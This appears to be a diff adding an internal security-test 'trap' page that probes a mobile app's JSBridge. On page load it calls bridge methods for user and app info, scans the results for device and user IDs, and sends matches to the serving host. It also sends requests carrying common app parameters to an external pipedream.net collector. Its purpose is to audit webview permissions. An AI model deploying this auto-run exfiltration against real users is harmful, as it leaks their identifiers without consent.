@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Jsbridge trigger</title>
+    <style>
+        .custom-button {
+            height: 150px;
+            width: 100%;
+            margin-right: 10px;
+        }
+
+        p {
+            word-break: break-all;
+            word-wrap: break-word;
+            white-space: pre-line;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- <script src="https://unpkg.com/vconsole/dist/vconsole.min.js"></script>
+    <script>
+        var vConsole = new window.VConsole
+    </script> -->
+    <script src="https://bdxbridge.web.bytedance.net/bytedance-jsbridge.umd.js"></script>
+    <!-- <script src="//sf1-scmcdn-tos.pstatp.com/goofy/fe/ies/bridge/bytedance/jsbridge-2.2.4.umd.js"></script> -->
+    <script>
+        var l3TestingList = ["appInfo", "userInfo", "app.userInfo", "app.appInfo", "x.userInfo", "x.appInfo", "getAppInfo", "getUserInfo", "app.getAppInfo", "app.getUserInfo", "x.getAppInfo", "x.getUserInfo", "LMGetInfo", "adInfo", "x.adInfo", "app.adInfo"]
+        // __globalprops.getGlobalProps()
+        var fetchTestingList = ["fetch", "x.request", "app.request", "app.fetch", "request", "safeHttpRequest", "luckycatRequestNetwork", "ttcjpay.request"]
+        var l3KeyList = ["did", "device_id", "deviceId", "uid", "user_id", "userId"]
+        var jsbCallBackCount = 0
+        var isAllCaseDoneCalled = false
+
+        const originalLog = console.log
+        const logArray = []
+        console.log = function(message) {
+          originalLog.apply(console, arguments)
+          logArray.push(message)
+          const logOutputElement = document.getElementById("jsbres")
+          logOutputElement.textContent = logArray.join("\n")
+        }
+
+        function callFunction(method, params, callback) {
+            var begeinTime = Date.now()
+            console.log(method + ' 开始测试')
+            jsbCallBackCount += 1
+            window.BDXBridge.call(method, params, function (data) {
+                var endTime = Date.now()
+                console.log(method + ' 方法耗时: ' + (endTime - begeinTime) + 'ms')
+                console.log(method + ' 返回结果: ' + JSON.stringify(data))
+                // document.getElementById("jsbres").innerHTML = JSON.stringify(data)
+                callback(method, data)
+                jsbCallBackCount -= 1
+            })
+        }
+
+        function tryFetch(url) {
+            jsbCallBackCount += 1
+            console.log("Start fetch: " + Date.now() + ", " + jsbCallBackCount + ", " + url)
+            fetch(url, { mode: 'no-cors' })
+                .then((response) => {
+                    jsbCallBackCount -= 1
+                    if (response.ok) {
+                        console.log("Finish fetch: " + Date.now() + ", " + jsbCallBackCount + ", " + url + ", response-ok")
+                    } else {
+                        console.log("Finish fetch: " + Date.now() + ", " + jsbCallBackCount + ", " + url + ", response-fail")
+                    }
+                })
+                .catch((error) => {
+                    var image = new Image()
+                    image.onload = () => {
+                        jsbCallBackCount -= 1
+                    }
+                    image.onerror = () => {
+                        jsbCallBackCount -= 1
+                    }
+                    image.src = url
+                })
+        }
+
+        function jsFetch() {
+            tryFetch(getBaseUrl() + "/jsrunning" + document.location.pathname)
+            shoots_stop()
+        }
+
+        function shoots_stop() {
+            if (document.location.protocol == "https:") {
+                tryFetch("https://192.168.0.2:23334/stop" + document.location.pathname)
+            } else {
+                tryFetch("http://192.168.0.2:23333/stop" + document.location.pathname)
+            }
+        }
+
+        function jsbFetch() {
+
+            // https://jsb.bytedance.net/host/1128/method/7670/detail/?productionId=1#interface
+            fetchTestingList.forEach((method) =>
+                callFunction(method, {
+                    "method": "GET",
+                    "url": "https://eo2bmxea4olrjro.m.pipedream.net/novelfm/bookmall/ecommerce/search/page/" + "/jsbfetch" + document.location.pathname + "?method=" + method,
+                    "needCommonParams": true,
+                    "addCommonParams": true
+                }, function (method, data) { }))
+        }
+
+        function extractContext(str, key) {
+            if (str.length <= 40){
+                return str
+            }
+            var keyIndex = str.indexOf(key)
+            if (keyIndex === -1) return ""
+            var startIndex = keyIndex - preLength < 0 ? 0 : keyIndex - preLength
+            var endIndex = keyIndex + key.length + postLength > str.length ? str.length : keyIndex + key.length + postLength
+            // 截取并返回上下文字符串
+            return "..."+str.substring(startIndex, endIndex)+"..."
+        }
+
+        function hasL3(method, data) {
+            data = JSON.stringify(data);
+            l3KeyList.some((element) => {
+                const elementLower = element.toLowerCase();
+                const dataLower = data.toLowerCase();
+                if (dataLower.indexOf(elementLower) !== -1) {
+                    const context = extractContext(dataLower, elementLower);
+                    console.log("Find L3 data in method=" + method + ": " + data)
+                    tryFetch(getBaseUrl() + "/jsbinfo" + document.location.pathname + "?method=" + method + "&data=" + context)
+                    return true; // 找到匹配的元素，跳出some循环
+                }
+                return false; // 继续some循环
+            });
+        }
+
+        function getBaseUrl() {
+            protocol = document.location.protocol
+            if (protocol == "https:") {
+                return "https://" + document.location.host
+            } else if (protocol == "http:") {
+                return "http://" + document.location.host
+            } else {
+                return "http://10.225.64.220"
+            }
+        }
+
+        function jsbAppInfo() {
+            try {
+                hasL3("__globalprops.getGlobalProps", __globalprops.getGlobalProps())
+            } catch (error) {
+                console.error(error)
+            }
+            l3TestingList.forEach((method) =>
+                callFunction(method, {}, function (method, data) { hasL3(method, data) }))
+        }
+
+        function allCaseDone() {
+            if (isAllCaseDoneCalled) {
+                return
+            }
+            isAllCaseDoneCalled = true
+            tryFetch(getBaseUrl() + "/allcasedone" + document.location.pathname)
+        }
+
+        function getLocation(){
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(location) {
+                      latitude=location.coords.latitude
+                      longitude=location.coords.longitude
+                      accuracy=location.coords.accuracy
+                      console.log("- latitude:"+latitude+" longitude:"+longitude+" accuracy:"+accuracy);
+                      PrivacyAgentJSBridge.onMessage(window.location.href)
+                    },
+                    function(error){
+                        console.log("getCurrentPosition failed.")
+                   },
+                   {enableHighAccuracy: true,timeout: 2000,maximumAge: 60000}
+                );
+            }
+        }
+
+        function run() {
+            jsFetch()
+            jsbFetch()
+            jsbAppInfo()
+            //getLocation()
+            // 或者超过6秒
+            setTimeout(() => {
+                console.log("Timeout 6s, execute allCaseDone()")
+                allCaseDone()
+            }, 6000)
+
+            // 确保所有回调完成
+            let timer = setInterval(function () {
+                if (jsbCallBackCount <= 0) {
+                    clearInterval(timer)
+                    console.log("jsbCallBackCount<=0, execute allCaseDone()")
+                    allCaseDone()
+                }
+            }, 100)
+        }
+
+        // 打开页面后自动触发
+        document.addEventListener('DOMContentLoaded', function () {
+            if (document.location.host.indexOf("l0g.") >= 0 || document.location.host.indexOf("evilamemv") >= 0 || document.location.host.indexOf("eviltoutiao") >= 0) {
+                // 如果在做http+白名单测试，不需要执行trap.html的内容
+                // eviltoutiao.com risk=3
+                shoots_stop()
+            } else {
+                run()
+            }
+        })
+    </script>
+    <button class="custom-button" onclick="run()">###Run Auto Test###</button><br />
+    <button class="custom-button" onclick="location.href=location.href+'?'">F5</button><br />
+    <button class="custom-button" onclick="jsFetch()">Stage1: JS fetch</button><br />
+    <button class="custom-button" onclick="jsbFetch()">Stage2: JSB fetch/x.request</button><br />
+    <button class="custom-button" onclick="jsbAppInfo()">Stage3: JSB appInfo</button><br />
+    <button class="custom-button" onclick="getLocation()">Stage4: geolocation getCurrentPosition</button><br />
+    <p id="jsbres">Response</p>
+    <iframe style="width:100%;height:300px" src="https://ttif4m.web.bytedance.net/template/bytedance3"></iframe>
+</body>
+
+</html>
